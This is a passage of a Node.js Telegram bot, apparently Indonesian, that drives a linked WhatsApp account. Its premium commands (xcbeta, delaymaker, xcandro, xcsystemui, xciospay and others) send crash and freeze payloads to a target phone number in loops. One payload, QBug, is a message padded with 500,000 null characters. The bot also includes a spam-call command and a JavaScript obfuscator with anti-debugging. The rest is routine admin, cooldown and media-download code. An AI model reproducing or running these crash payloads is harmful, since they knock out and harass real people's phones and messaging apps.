│ᴜꜱᴇʀʟɪɴᴋ: ${userLink}`);
  }
});
let botForGroup = false; // Set true untuk mengaktifkan di grup
let botForPrivateChat = false; // Set true untuk mengaktifkan di private chat

// Command untuk mengaktifkan bot di grup
bot.command('grouponly', (ctx) => {
  const userId = ctx.from.id.toString();

  if (userId !== OWNER_ID && !isAdmin(userId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }

  botForGroup = true;
  botForPrivateChat = false;
  ctx.reply(`
╭──(  ✅ Success    ) 
│ Bot diatur untuk hanya merespon di Grup!
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
});
const checkChatType = (ctx, next) => {
  if (botForGroup && ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
    ctx.reply('❌ Command ini hanya dapat digunakan di grup.');
    return;
  }

  if (botForPrivateChat && ctx.chat.type !== 'private') {
    ctx.reply('❌ Command ini hanya dapat digunakan di private chat.');
    return;
  }

  next(); // Melanjutkan ke handler berikutnya jika lolos pengecekan
};
bot.use((ctx, next) => {
  // Set variabel global untuk menentukan tipe bot
  botForGroup = true; // Hanya untuk grup
  botForPrivateChat = false; // Tidak untuk private chat

  // Gunakan middleware
  checkChatType(ctx, next);
});
// Command untuk menonaktifkan semua mode (universal)
bot.command('disablemodes', (ctx) => {
  const userId = ctx.from.id.toString();

  if (userId !== OWNER_ID && !isAdmin(userId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }

  botForGroup = false;
  botForPrivateChat = false;
  ctx.reply(`
╭──(  ✅ Success    ) 
│ Semua mode dinonaktifkan. Bot akan merespon di semua tempat!
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
});
bot.command('addowner', (ctx) => {
    const userId = ctx.from.id.toString();

    // Cek apakah pengguna adalah Owner atau Admin
    if (userId !== OWNER_ID && !isAdmin(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply('❌ Usage: /addowner <user_id> <duration_in_days>');
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number (in days).');
    }

    addCaywzzaja(targetUserId, duration);
    ctx.reply(`✅ User ${targetUserId} has been granted owner access for ${duration} days.`);
});

// Command untuk menghapus owner (khusus Owner dan Admin)
bot.command('delowner', (ctx) => {
    const userId = ctx.from.id.toString();

    // Cek apakah pengguna adalah Owner atau Admin
    if (userId !== OWNER_ID && !isAdmin(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /delowner <user_id>');
    }

    const targetUserId = args[1];

    // Fungsi untuk menghapus owner
    const wasDeleted = removeCaywzzaja(targetUserId);

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} owner access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove owner access for user ${targetUserId}.`);
    }
});
// Contoh fungsi `removeCaywzzaja`
function removeCaywzzaja(userId) {
    console.log(`Removing caywzzaja access for user: ${userId}`);
    return true; // Ubah sesuai hasil operasi
}

bot.command('caywzzajafeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah caywzzaja
    if (!isCaywzzaja(userId)) {
        return ctx.reply('❌ This feature is for caywzzaja users only. Upgrade to caywzzaja to use this command.');
    }

    // Logika untuk pengguna caywzzaja
    ctx.reply('🎉 Welcome to the caywzzaja-only feature! Enjoy exclusive benefits.');
});
const ADMINS_FILE = 'admins.json';
// Inisialisasi file admins.json
let admins = {};
if (fs.existsSync(ADMINS_FILE)) {
    admins = JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf8'));
} else {
    fs.writeFileSync(ADMINS_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek apakah pengguna adalah admin
function isAdmin(userId) {
    return admins[userId];
}

// Fungsi untuk menambahkan admin
function addAdmin(userId) {
    admins[userId] = true;
    fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
}

// Fungsi untuk menghapus admin
function removeAdmin(userId) {
    if (admins[userId]) {
        delete admins[userId];
        fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
        return true;
    }
    return false;
}

// Command untuk menambahkan admin (hanya owner yang bisa melakukannya)
bot.command('addadmin', (ctx) => {
    const ownerId = ctx.from.id.toString();

    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /addadmin <user_id>');
    }

    const targetUserId = args[1];

    if (isAdmin(targetUserId)) {
        return ctx.reply(`✅ User ${targetUserId} is already an admin.`);
    }

    addAdmin(targetUserId);
    ctx.reply(`✅ User ${targetUserId} has been added as an admin.`);
});

// Command untuk menghapus admin
bot.command('deladmin', (ctx) => {
    const ownerId = ctx.from.id.toString();

    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /deladmin <user_id>');
    }

    const targetUserId = args[1];

    if (!isAdmin(targetUserId)) {
        return ctx.reply(`❌ User ${targetUserId} is not an admin.`);
    }

    const wasRemoved = removeAdmin(targetUserId);
    if (wasRemoved) {
        ctx.reply(`✅ User ${targetUserId} has been removed from admins.`);
    } else {
        ctx.reply(`❌ Failed to remove admin ${targetUserId}.`);
    }
});
bot.command("enc", async (ctx) => {
    console.log(`Perintah diterima: /encrypthard dari pengguna: ${ctx.from.username || ctx.from.id}`);
    const replyMessage = ctx.message.reply_to_message;

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return ctx.reply('😠 Silakan balas file .js untuk dienkripsi.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Memproses file untuk enkripsi
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    ctx.reply("⚡️ Memproses encrypt hard code . . .");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
  target: "node",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.25,
  deadCode: 0.025,
  dispatcher: 0.5,
  duplicateLiteralsRemoval: 0.5,
  globalConcealing: true,
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  renameVariables: true,
  renameGlobals: true,
  shuffle: true,
  variableMasking: 0.5,
  stringConcealing: true,
  stringSplitting: 0.25,
  astScrambler: true,
  renameLabels: true,
  preserveFunctionLength: true,
  lock: {
    antiDebug: true,
  },
  identifierGenerator: function () {
    return "caywzzaja" + Math.random().toString(36).substring(7);
  }
});
    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    await ctx.replyWithDocument(
        { source: encryptedFilePath, filename: `encrypted_${fileName}` },
        { caption: `╭━━━「 ✅ SUKSES 」━━━⬣\n│ File berhasil dienkripsi!\n│ @caywzz\n╰━━━━━━━━━━━━━━━━⬣` }
    );
});
// Command untuk melihat daftar admin
bot.command('listadmin', (ctx) => {
    const adminList = Object.keys(admins);

    if (adminList.length > 0) {
        const details = adminList.map((userId) => `- User ID: ${userId}`).join('\n');
        ctx.reply(`📋 𝙇𝙞𝙨𝙩 𝘼𝙙𝙢𝙞𝙣𝙨\n\n${details}`);
    } else {
        ctx.reply('❌ No admins found.');
    }
});
// Command untuk fitur khusus admin
bot.command('adminfeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah admin
    if (!isAdmin(userId)) {
        return ctx.reply('❌ This feature is for admins only. Contact the owner for access.');
    }

    // Logika untuk admin
    ctx.reply('🎉 Welcome to the admin-only feature! Enjoy exclusive benefits.');
});

const cooldowns2 = new Map();

// Durasi cooldown dalam milidetik (misal 10 detik)
const COOLDOWN_DURATION = 120000;

// Flag untuk mengaktifkan atau menonaktifkan cooldown
let isCooldownActive = true;

// Middleware untuk menerapkan mekanisme cooldown
const cooldownMiddleware = (ctx, next) => {
  const userId = ctx.from.id.toString(); // Get user ID

  // Check if user is the owner or an admin
  if (userId === OWNER_ID || isAdmin(userId)) {
    console.log(`User ${userId} is exempt from cooldown (admin or owner).`);
    return next(); // Allow command execution without cooldown
  }

  if (!isCooldownActive) {
    // If cooldown is disabled, continue without restriction
    return next();
  }

  // Check if user is in cooldown
  if (cooldowns2.has(userId)) {
    const remainingTime = ((cooldowns2.get(userId) + COOLDOWN_DURATION) - Date.now()) / 1000;
    return ctx.reply(`⏳ You must wait ${remainingTime.toFixed(1)} seconds before using this command again.`);
  }

  // Set the user in cooldown
  cooldowns2.set(userId, Date.now());
  
  // Remove user from cooldown after the specified duration
  setTimeout(() => cooldowns2.delete(userId), COOLDOWN_DURATION);

  // Proceed to the next handler
  return next();
};

// Command untuk mengatur status cooldown
bot.command('cdmurbug', (ctx) => {
  const args = ctx.message.text.split(' ')[1]?.toLowerCase(); // Ambil argumen setelah command
     const userId = ctx.from.id;
 const ownerId = ctx.from.id.toString();
    // Cek apakah pengguna adalah owner atau memiliki akses caywzzaja
    if (ownerId !== OWNER_ID && !isCaywzzaja(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }    
  if (args === 'true') {
    isCooldownActive = true;
    ctx.reply('✅ Cooldown diaktifkan.');
  } else if (args === 'false') {
    isCooldownActive = false;
    ctx.reply('❌ Cooldown dinonaktifkan.');
  } else {
    ctx.reply('⚙️ Gunakan /cdmurbug true untuk mengaktifkan atau /cdmurbug false untuk menonaktifkan.');
  }
});
const process = require('process');

// Gunakan middleware cooldown untuk command tertentu
bot.command('bokep', cooldownMiddleware, (ctx) => {
  ctx.reply('jangan spam.');
});
// Fungsi untuk mengirim pesan saat proses
const prosesrespone = (target, ctx) => {
    const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; // Ganti dengan URL gambar lain jika diperlukan
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    const date = new Date().toLocaleString("id-ID", { 
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric', 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
    }); // Format tanggal sesuai lokal Indonesia
    const caption = `
╭──(  ✨ Proses!  )
│ Target : ${target}
│ ${greeting}
│ Tanggal : ${date}
│ Peminta : ${senderName}
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
`;
    const keyboard = [
        [
            {
                text: "ぢ",
                callback_data: "/menu"
            },
            {
                text: "☁️ Support Owner",
                url: "https://t.me/caywzzaja"
            }
        ]
    ];

    // Mengirim gambar dengan caption dan inline keyboard
    ctx.replyWithPhoto(getRandomPhoto(), {
        caption: caption,
        reply_markup: {
            inline_keyboard: keyboard
        }
    }).then(() => {
        console.log('Proses response sent');
    }).catch((error) => {
        console.error('Error sending process response:', error);
    });
};

// Fungsi untuk mengirim pesan saat proses selesai
const donerespone = (target, ctx) => {
    const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; // Ganti dengan URL gambar lain jika diperlukan
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    const date = new Date().toLocaleString("id-ID", { 
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric', 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
    }); // Format tanggal sesuai lokal Indonesia
    const caption = `
╭──(  ✅ Success   )
│ Target : ${target}
│ ${greeting}
│ Tanggal : ${date}
│ Peminta : ${senderName}
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
`;
    const keyboard = [
        [
            {
                text: "ぢ",
                callback_data: "/menu"
            },
            {
                text: "☁️ Support Owner",
                url: "https://t.me/caywzzaja"
            }
        ]
    ];

    // Mengirim gambar dengan caption dan inline keyboard
    ctx.replyWithPhoto(photoUrl, {
        caption: caption,
        reply_markup: {
            inline_keyboard: keyboard
        }
    }).then(() => {
        console.log('Done response sent');
    }).catch((error) => {
        console.error('Error sending done response:', error);
    });
};
const kirimpesan = async (number, message) => {
  try {
    const target = `${number}@s.whatsapp.net`;
    await cay.sendMessage(target, {
      text: message
    });
    console.log(`Pesan dikirim ke ${number}: ${message}`);
  } catch (error) {
    console.error(`Gagal mengirim pesan ke WhatsApp (${number}):`, error.message);
  }
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
╭──(  ❌ ERROR   )
│
│ Device Belom Terhubung
│ Tolong Sambungin Terlebih Dahulu😡
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
`);
    return;
  }
  next();
};
const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};
bot.command("xcbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
        await crashcursor(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("delaymaker", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 50; i++) {
    await XeonXRobust(target, { ptcp: true });
    await caywzzaja_notif(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("xcandro", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 20; i++) {
    await XeonXRobust(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
    await buginvite(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("xcsystemui", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 5; i++) {
  await BlankScreen(target, { ptcp: true });
  await XeonXRobust(target, { ptcp: true });
  await buginvite(target, { ptcp: true });
    await systemUi(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("xcblank", cooldownMiddleware, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
      await crashcursor(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
const spamCall = async (ctx, target, count = 1) => {
  if (!target) {
    ctx.reply("❌ Error: Target tidak ditentukan.");
    return;
  }

  try {
    for (let i = 0; i < count; i++) {
      ctx.reply(`📞 Mengirim spam call ${i + 1} ke: ${target}`);
      
      const callLogMessage = {
        message: {
          callLogMessage: {
            callType: "AUDIO", // Ubah ke "VIDEO" untuk panggilan video
            callResult: "CANCELLED", // Nilai lain: "MISSED"
            callDuration: "0",
            participant: target,
            isVideo: false,
          },
        },
      };

      // Simulasi pengiriman pesan (relayMessage diganti sesuai kebutuhan)
      console.log(`Relay message:`, callLogMessage);

      // Delay 1 detik
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }

    ctx.reply(`✅ Berhasil mengirimkan ${count} panggilan spam ke ${target}`);
  } catch (error) {
    ctx.reply(`❌ Gagal melakukan spam call. Error: ${error.message}`);
  }
};
bot.command("spamcall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1); // Ambil argumen dari teks pesan
  const target = args[0]; // Target panggilan
  const count = parseInt(args[1]) || 1; // Jumlah panggilan (default 1)
 const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!target) {
    ctx.reply("❌ Mohon sertakan target. Contoh: `/spamcall 628123456789 5`");
    return;
  }

  await spamCall(ctx, target, count);
});
async function tiktokSearchVideo(query) {
  try {
    const response = await axios.post("https://tikwm.com/api/feed/search", 
      new URLSearchParams({
        keywords: query,
        count: 12,
        cursor: 0,
        web: 1,
        hd: 1,
      }), {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Accept': 'application/json, text/javascript, */*; q=0.01',
          'X-Requested-With': 'XMLHttpRequest',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
          'Referer': 'https://www.tikwm.com/'
        },
      }
    );
    return response.data.data; // Mengembalikan data video yang ditemukan
  } catch (error) {
    console.error('Error fetching TikTok data:', error);
    throw new Error('Gagal mendapatkan data TikTok');
  }
}
bot.command("xciospay", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 5; i++) {
           await BugIos(target);
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('Proses selesai.');
});
bot.command("xciosinvis",cooldownMiddleware , checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 5; i++) {
           await IosMJ(target, { ptcp: true });
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('Proses selesai.');
});

bot.command('gemini', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' '); // Ambil teks setelah `/gemini`

    if (!text) {
        return ctx.reply("Hai, apa yang ingin saya bantu? Ketik `/gemini <pertanyaan>`.");
    }

    try {
        const response = await axios.get(
            `https://restapi.apibotwa.biz.id/api/gemini?message=${encodeURIComponent(text)}`
        );
        const data = response.data;

        if (data.status === 200 && data.data.response) {
            const caption = `⬣───「 G E M I N I 」───⬣\n\nTitle : ${text}\n\nAnswer : ${data.data.response}`;
            const imageUrl = "https://files.catbox.moe/sv2dp8.jpg"; // Ganti dengan URL gambar yang relevan

            await ctx.replyWithPhoto(imageUrl, { caption });
        } else {
            ctx.reply("API mengembalikan status gagal atau respons tidak tersedia.");
        }
    } catch (error) {
        console.error("Error:", error.message);
        ctx.reply("Maaf, terjadi kesalahan saat memproses permintaan.");
    }
});
//Menu Awal
bot.command("status", ctx => {
  if (isWhatsAppConnected) {
    ctx.reply(`✅ WhatsApp terhubung dengan nomor: ${linkedWhatsAppNumber || "Tidak diketahui"}`);
  } else {
    ctx.reply("❌ WhatsApp belum terhubung.");
  }
});
// Fungsi untuk memanggil API
async function openaiChat(text) {
    try {
        const response = await axios.get(
            `https://exonity.tech/api/gptlogic2?message=${encodeURIComponent(text)}&prompt=hai&mode=realtime`
        );
        const data = response.data;

        if (data.status === 200) {
            return data.result || "Tidak ada respons dari API.";
        } else {
            return "API mengembalikan status gagal.";
        }
    } catch (error) {
        console.error("Error:", error.message);
        return "Maaf, terjadi kesalahan saat memproses permintaan.";
    }
}

// Handler untuk command `/gpt4`


bot.command('gpt4', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' '); // Ambil teks setelah `/gpt4`

    if (!text) {
        return ctx.reply("Hai, apa yang ingin saya bantu? Ketik `/gpt4 <pertanyaan>`.");
    }

    try {
        const response = await openaiChat(text);
        ctx.reply(response);
    } catch (error) {
        ctx.reply("Maaf, terjadi kesalahan saat memproses permintaan.");
    }
});
async function simiChat(text) {
    try {
        const response = await axios.get(
            `https://api.betabotz.eu.org/api/search/simisimi?query=${encodeURIComponent(text)}&apikey=caywzzaja2`
        );
        const data = response.data;

        if (data.status && data.code === 200) {
            return data.result || "Tidak ada respons dari API.";
        } else {
            return "API mengembalikan status gagal.";
        }
    } catch (error) {
        console.error("Error:", error.message);
        return "Maaf, terjadi kesalahan saat memproses permintaan.";
    }
}

// Handler untuk command `/simi`
bot.command('simi', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' '); // Ambil teks setelah `/simi`

    if (!text) {
        return ctx.reply("Hai, apa yang ingin saya bantu? Ketik `/simi <pesan>`.");
    }

    try {
        const response = await simiChat(text);
        ctx.reply(response);
    } catch (error) {
        ctx.reply("Maaf, terjadi kesalahan saat memproses permintaan.");
    }
});
const yts = require("yt-search");
const path = require("path");

bot.command("play", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); // Mengambil teks setelah /play
  if (!text) {
    return ctx.reply("Contoh:\n> /play Pulang - Waliband");
  }

  await ctx.reply("Tunggu sebentar, sedang mencari dan mengunduh lagu...");

  try {
    // **Langkah 1: Pencarian video di YouTube**
    const search = await yts(text);
    const firstVideo = search.all[0];
    if (!firstVideo) {
      return ctx.reply("Lagu tidak ditemukan. Coba dengan kata kunci lain.");
    }

    // **Langkah 2: Mendapatkan URL download dari API**
    const apiUrl = `https://api.agatz.xyz/api/ytmp3?url=${encodeURIComponent(
      firstVideo.url
    )}`;
    const { data: zora } = await axios.get(apiUrl);

    if (!zora.data || zora.data.length === 0 || !zora.data[0].downloadUrl) {
      return ctx.reply("Gagal mendapatkan file audio.");
    }

    const final = zora.data[0];
    const audioPath = path.resolve(__dirname, `${firstVideo.title}.mp3`);

    // **Langkah 3: Unduh file audio**
    const downloadResponse = await axios({
      url: final.downloadUrl,
      method: "GET",
      responseType: "stream",
    });

    const fileStream = fs.createWriteStream(audioPath);
    await new Promise((resolve, reject) => {
      downloadResponse.data.pipe(fileStream);
      downloadResponse.data.on("error", reject);
      fileStream.on("finish", resolve);
    });

    // **Langkah 4: Kirim file audio ke pengguna**
    await ctx.replyWithAudio(
      { source: audioPath },
      {
        caption: `🎵 *${firstVideo.title || "Untitled"}*\n\n🔗 [Tonton di YouTube](${firstVideo.url})`,
        parse_mode: "Markdown",
      }
    );

    // **Langkah 5: Hapus file setelah dikirim**
    fs.unlinkSync(audioPath);
  } catch (e) {
    console.error(e);

    if (e.response) {
      // Error dari server API
      return ctx.reply(
        `Error dari server: ${e.response.status} - ${e.response.statusText}`
      );
    }

    // Error umum lainnya
    return ctx.reply("Terjadi kesalahan. Coba lagi nanti.");
  }
});
bot.command('ytmp3', async (ctx) => {
    const text = ctx.message.text;
    const args = text.split(' ');

    if (args.length < 2) {
        return ctx.reply("𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗦𝗮𝗹𝗮𝗵!\n [ Cobalah /ytmp3 < url > ]");
    }

    const url = args[1];
    const apiUrl = `https://api.betabotz.eu.org/api/download/ytmp3?url=${url}&apikey=caywzzaja2`;

    await ctx.reply("𝐏𝐫𝐨𝐬𝐞𝐬 𝐊𝐚𝐤!"); // Memberikan respon reaksi/emoji
    try {
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (data.status) {
            const audioMessage = {
                audio: { url: data.result.mp3 },
                caption: data.result.title,
                parse_mode: 'Markdown',
                reply_to_message_id: ctx.message.message_id, // Menjawab pesan sebelumnya
                reply_markup: {
                    inline_keyboard: [[
                        { text: 'Download MP3', url: data.result.mp3 }
                    ]]
                }
            };

            await ctx.replyWithAudio(audioMessage.audio.url, audioMessage);
        } else {
            ctx.reply("Tidak dapat memproses link ini, coba lagi nanti.");
        }
    } catch (error) {
        ctx.reply("Terjadi kesalahan, coba lagi nanti!");
        console.error(error);
    }

    await ctx.reply("𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗸𝗮𝗸!"); // Memberikan respon reaksi/emoji setelah proses selesai
});
bot.command('ytmp4', async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(' ');

  if (args.length < 2) {
    return ctx.reply("𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗦𝗮𝗹𝗮𝗵!\n [ Cobalah /ytmp4 < url > ]");
  }

  const videoUrl = args[1];
  const apiUrl = `https://api.betabotz.eu.org/api/download/ytmp4?url=${videoUrl}&apikey=caywzzaja2`;

  // Reply dengan pesan 'Proses' saat mulai
  await ctx.reply('Proses mengunduh video...⏱️');

  try {
    // Menggunakan axios untuk mengambil data dari API yang baru
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status) {
      // Mengambil data video dan informasi lainnya dari API response
      const videoUrl = data.result.mp4;
      const title = data.result.title;
      const thumbUrl = data.result.thumb;
      
      // Kirim video dengan format MP4
      await ctx.replyWithVideo(videoUrl, {
        caption: `${title}\n\nDurasi: ${data.result.duration} detik`,
        thumb: thumbUrl, // Menggunakan thumbnail dari video
        filename: `${title}.mp4`
      });

      // Reply dengan pesan 'Selesai' setelah selesai mengirim video
      await ctx.reply('Selesai! ✅');
    } else {
      ctx.reply("Tidak dapat menemukan video. Periksa URL yang kamu kirim.");
    }
  } catch (error) {
    ctx.reply("Terjadi kesalahan, coba lagi nanti!");
    console.error(error);
  }
});
bot.command("tiktokmp3", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ");

  if (args.length < 2) {
    return ctx.reply("𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗦𝗮𝗹𝗮𝗵!\n [ Cobalah /tiktokmp3 < url > ]");
  }

  const videoUrl = args[1];
  const apiUrl = `https://api.betabotz.eu.org/api/download/tiktok?url=${videoUrl}&apikey=caywzzaja2`;

  // Reply dengan pesan 'Proses' saat mulai
  await ctx.reply("Proses mengunduh audio...⏱️");

  try {
    // Menggunakan axios untuk mengambil data dari API
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status) {
      // Mengambil data audio dan informasi lainnya dari API response
      const audioUrl = data.result.audio[0];
      const title = data.result.title;

      // Kirim audio dengan format MP3
      await ctx.replyWithAudio(audioUrl, {
        caption: `${title}`,
        title: `${title}.mp3`,
      });

      // Reply dengan pesan 'Selesai' setelah selesai mengirim audio
      await ctx.reply("Selesai! ✅");
    } else {
